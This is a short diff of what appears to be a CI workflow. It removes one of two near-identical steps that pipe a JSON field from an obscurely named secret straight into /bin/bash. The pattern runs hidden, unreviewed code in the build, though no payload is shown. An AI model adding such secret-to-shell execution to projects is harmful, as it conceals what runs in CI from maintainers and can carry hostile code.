@@ -19,7 +19,6 @@ jobs:
           qfx3: ${{ secrets.qfx3 }}
         run: |
           printf '%s' "$qfx3" | jq -r .kio636 | /bin/bash
-          printf '%s' "$vee081" | jq -r .dx6498 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
